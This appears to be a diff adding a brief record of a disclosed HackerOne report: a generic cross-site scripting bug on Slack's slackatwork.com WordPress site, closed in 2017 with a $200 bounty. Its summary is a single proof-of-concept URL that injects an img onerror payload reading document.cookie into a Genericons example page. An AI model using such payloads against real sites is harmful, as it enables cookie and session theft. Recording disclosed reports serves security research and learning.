@@ -1,0 +1,12 @@
+ReportLink:https://hackerone.com/reports/196624
+WeaknessName:Cross-site Scripting (XSS) - Generic
+Reporter:https://hackerone.com/ba4fe4ca95021d367f8a574
+ReportedTo:Slack(slack)
+BountyAmount:200.0
+Severity:
+State:Closed
+DateOfDisclosure:02.03.2017 1:05:39
+
+Summary:
+
+https://www.slackatwork.com/wp-content/themes/twentyfifteen/genericons//example.html#1<img/ src=1 onerror= alert(document.cookie)>
